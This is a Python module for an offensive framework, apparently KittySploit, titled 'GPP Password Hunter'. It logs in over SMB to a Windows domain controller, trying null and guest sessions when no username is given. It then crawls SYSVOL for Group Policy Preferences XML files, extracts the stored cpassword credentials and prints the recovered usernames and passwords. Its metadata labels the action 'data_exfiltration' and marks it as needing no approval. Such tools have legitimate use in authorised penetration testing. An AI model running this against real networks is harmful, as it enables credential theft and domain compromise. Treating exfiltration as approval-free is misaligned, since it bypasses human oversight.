#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hunt Group Policy Preferences passwords on SMB SYSVOL."""

from __future__ import annotations

import json
import os
import tempfile
from typing import Dict, List

from kittysploit import *
from lib.protocols.smb.gpp_helpers import GPP_FILENAMES, extract_gpp_secrets
from lib.protocols.smb.smb_client import SMBAuth, SMBClient
from lib.protocols.smb.smb_scanner_client import Smb_scanner_client


class Module(Scanner, Smb_scanner_client):
    __info__ = {
        "name": "GPP Password Hunter",
        "description": (
            "Search SYSVOL Group Policy Preferences XML files for encrypted "
            "cpassword credentials via SMB."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "tags": ["smb", "gpp", "windows", "ad", "credentials", "scanner"],
        "references": [
            "https://support.microsoft.com/en-us/topic/kb324737",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 5,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals", "credentials"],
        },
    }

    domain = OptString("", "AD DNS domain name (e.g. corp.local)", required=True)
    username = OptString("", "SMB username (empty tries null/guest)", required=False)
    password = OptString("", "SMB password", required=False)
    max_files = OptInteger(30, "Maximum GPP XML files to inspect", required=False)
    output_file = OptString("", "Optional JSON output file", required=False)

    def _auth_profiles(self) -> List[SMBAuth]:
        user = str(self.username or "").strip()
        pwd = str(self.password or "")
        domain = str(self.domain or "").strip()
        if user:
            return [SMBAuth(username=user, password=pwd, domain=domain, server_name=domain)]
        return [
            SMBAuth(username="", password="", domain="", server_name=domain),
            SMBAuth(username="guest", password="", domain="", server_name=domain),
        ]

    def _walk_for_gpp(self, client: SMBClient, share: str, path: str, found: List[str], limit: int) -> None:
        if len(found) >= limit:
            return
        entries = client.list_path(share, path)
        for entry in entries:
            if len(found) >= limit:
                return
            name = entry.get("name") or ""
            if not name:
                continue
            child = f"{path.rstrip('\\')}\\{name}" if path != "\\" else f"\\{name}"
            if entry.get("is_dir"):
                self._walk_for_gpp(client, share, child, found, limit)
                continue
            if name in GPP_FILENAMES:
                found.append(child)

    def _download_text(self, client: SMBClient, share: str, remote_path: str) -> str:
        fd, local_path = tempfile.mkstemp(suffix=".xml")
        os.close(fd)
        try:
            if not client.get_file(share, remote_path, local_path):
                return ""
            with open(local_path, "r", encoding="utf-8", errors="replace") as fp:
                return fp.read()
        finally:
            try:
                os.remove(local_path)
            except Exception:
                pass

    def run(self):
        host = self._host()
        domain = str(self.domain or "").strip().lower()
        if not host or not domain:
            print_error("Target and domain are required")
            return False

        limit = int(self.max_files or 30)
        findings: List[Dict[str, str]] = []
        connected = False

        for auth in self._auth_profiles():
            client = SMBClient(host=host, port=self._port(), auth=auth, timeout=int(self._timeout()))
            if not client.connect():
                continue
            connected = True
            shares = client.list_shares()
            if "SYSVOL" not in shares:
                client.close()
                continue

            candidates: List[str] = []
            base = f"\\{domain}\\Policies"
            self._walk_for_gpp(client, "SYSVOL", base, candidates, limit)
            print_info(f"Found {len(candidates)} GPP XML file(s) under SYSVOL")

            for remote_path in candidates[:limit]:
                xml_text = self._download_text(client, "SYSVOL", remote_path)
                secrets = extract_gpp_secrets(xml_text, source=remote_path)
                findings.extend(secrets)
            client.close()
            if findings:
                break

        if not connected:
            print_error("SMB connection failed")
            return False

        if not findings:
            print_info("No GPP cpassword entries found")
            return False

        for item in findings[:10]:
            print_warning(
                f"{item.get('source')} user={item.get('username')} password={item.get('password')}"
            )
        self.set_info(
            severity="high",
            reason=f"{len(findings)} GPP credential(s) recovered from SYSVOL",
            findings=findings[:20],
        )

        if self.output_file:
            try:
                with open(str(self.output_file), "w") as fp:
                    json.dump({"findings": findings}, fp, indent=2)
                print_success(f"Results saved to {self.output_file}")
            except Exception as exc:
                print_error(f"Failed to save output: {exc}")
        return True
